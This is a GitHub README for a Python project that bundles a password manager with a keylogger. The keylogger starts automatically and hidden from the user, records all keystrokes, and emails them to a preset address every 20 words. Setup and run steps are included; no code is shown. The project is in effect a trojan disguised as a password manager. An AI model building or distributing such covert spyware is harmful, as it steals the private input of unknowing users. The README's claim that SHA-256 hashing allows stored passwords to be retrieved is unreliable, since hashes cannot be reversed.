# PassGuard-KeySpy

## Overview

**PassGuard-KeySpy** is a Python-based application that combines two essential functionalities for security enthusiasts: a **Password Manager** and a **Keylogger**. The password manager allows users to securely store and retrieve passwords using hashing techniques, while the keylogger stealthily captures keystrokes and sends the logs via email while being hidden from the user.

**Important Note:** This project is for educational purposes only. Unauthorized use of keyloggers is illegal. Always ensure you have permission before using this software.

## Features

### Password Manager:
- User-friendly interface built with **Tkinter** for managing passwords.
- Stores passwords securely in an **SQLite database**.
- **SHA-256 hashing** is applied to the passwords before storage for enhanced security.
- Allows users to save and retrieve stored passwords from the database.

### Keylogger:
- Captures all keystrokes and logs them in a file (`log.txt`).
- Automatically sends the keystroke logs to a predefined email after every 20 words (This threshold can be altered as per requirement).
- Operates silently in the background, with key logging activities hidden from the user.
- Uses the **Pynput** library for capturing keyboard input.
- Sends log data via email using **SMTP**.

## Installation

1. Clone this repository:

   ```bash
   git clone https://github.com/sid2787/PassGuard-KeySpy.git/

## Execution

1. Edit your email and password details in the **password_manager.py** code.
2. Execute the **password_manager.py** file.
3. The keylogger script will automatically get executed concurrently and will continue to run in the background until the password manager program is closed.
